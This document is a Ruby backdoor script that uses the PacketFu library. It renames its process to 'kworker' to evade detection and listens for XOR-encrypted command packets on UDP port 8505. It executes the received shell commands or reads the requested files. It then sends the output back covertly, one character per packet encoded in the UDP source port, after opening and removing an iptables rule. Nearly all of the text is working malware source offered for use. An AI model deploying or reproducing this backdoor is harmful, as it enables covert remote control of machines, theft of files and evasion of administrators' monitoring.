#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require 'socket'
include PacketFu

=begin

This backdoor masks itself to avoid detection in the process table by appearing as "kworker"
This backdoor will receive a command packet from the client and send the results back covertly
It is run by entering the command "ruby backdoor.rb".


=end

#Define Variables

$filter = "udp and port 8505" 	#filter for sniffing packets
$passcode = "5000"				#password code for encrypting and decrypting
$dport = 12345					#Destination port for the packets that are to be sent
$key = "$key"					#password key for authenticating the packets
$ipcfg = Utils.whoami?(:iface=>"em1")	#interface to listen and send packets


#Encryption/Decryption Method
def decrypt(encryptedPayload)
	decryptedPayload = ""
	pass_array = $passcode.split(//)
    	i = 0
    	encryptedPayload.each_char do |c|
      	pass_char = pass_array[i]
     	xor = c.chr.ord ^ pass_char.ord
      	i+=1
	decryptedPayload += xor.chr
	      	if i == (pass_array.size - 1)
			i = 0
	      	end
  	end
	return decryptedPayload
end

#Packet Sniffer Method
def sniffer(iface)
	puts "Sniffing Packets"
	#Capture packets with a filter on only UDP packets with a destination port of 8505
	cap = Capture.new(:iface => iface, :start => true, :filter => $filter, :save=>true)
	cap.stream.each do |p|
	pkt = Packet.parse p
		$command = ""
		#Grab Payload and Decrypt the contents
		puts "Recieved Packet"
		puts "Original Encrypted: " + pkt.payload
		pkt.payload.gsub!(/\0/,'')
		packetPayload = decrypt(pkt.payload)
		puts "Decrypted: " + packetPayload
		
		#Check to see if the payload contains password key for authentication
		if packetPayload.include?($key)
			puts "Packet contains key password"
			payloadCount= $key.size+1
		
		#Grab the command
			while true
				if packetPayload[payloadCount].nil?
					break
				else
				temp = packetPayload[payloadCount]
				$command += temp
				payloadCount += 1
				end
				
			end
			puts "The command is " + $command
			
			#Execute the command
			if packetPayload[$key.size] == 'c'
				commandResults = `#{$command}`
				
			#Find the file
			elsif packetPayload[$key.size] == 'f'
				commandResults = `locate #{$command}`
				puts "The full file path is" + commandResults
				commandResults.gsub!("\n",'')
				commandResults = File.read(commandResults)
			else
				"Error: No Option was chosen"
			end
			
			sleep(2)
			#Create Firewall rule for outbound packets to the client
			`iptables -A OUTPUT -p udp -d #{pkt.ip_saddr} -j ACCEPT`
			
			generateData(pkt.eth_saddr.to_s,pkt.ip_saddr.to_s,pkt.ip_daddr,pkt.udp_sport,pkt.udp_dst,commandResults)
			break
		
		else
			puts "Packet was not authenticated."
		end
	end
end


#Generate data method by getting each character and using the generate packet method
def generateData(eth_saddr,ip_saddr,ip_daddr,src_port,dst_port,results)
	char_count = 0
	generatedPayload = ""	
	while char_count < results.length  
		if results.each_char.nil?
			break
		else
		#Convert each character to Integer Value and multiply by 500
		results.each_char do |c|
			chPort = c.ord * 500
			char_count+=1
			
			#Send Data for Packet sending	
			generatePacket(eth_saddr,ip_saddr,ip_daddr,src_port,dst_port,chPort,generatedPayload)
			sleep(1)
			end
		break
		end
	end
	#Send last packet to tell client that transmission is done
	generatePacket(eth_saddr,ip_saddr,ip_daddr,src_port,dst_port,9898,$key)
	
	#Remove firewall rule from the table
	`iptables -D OUTPUT -p udp -d #{ip_saddr} -j ACCEPT`
	
	sniffer(@interface)
end

#Generate and Send packet method
def generatePacket(eth_saddr,ip_saddr,ip_daddr,src_port,dst_port,results,payload)
		udp_pkt=UDPPacket.new
		udp_pkt.eth_saddr=$ipcfg[:eth_saddr]
		udp_pkt.eth_daddr=eth_saddr		
		#Source port contains the data to be sent
		udp_pkt.udp_src=results
		udp_pkt.udp_dst=$dport
		udp_pkt.ip_saddr=ip_daddr
		udp_pkt.ip_daddr=ip_saddr
		udp_pkt.payload=payload
		# Recalculate the UDP packet and send it
		puts "Sending Packet: " + (results / 500).chr
		udp_pkt.recalc
		udp_pkt.to_w(@interface)
end

begin
	#Mask Name of backdoor process
	$0 = 'kworker'
	#Start Sniffing for Packets
	sniffer(@interface)
	rescue Interrupt
	exit 0
end
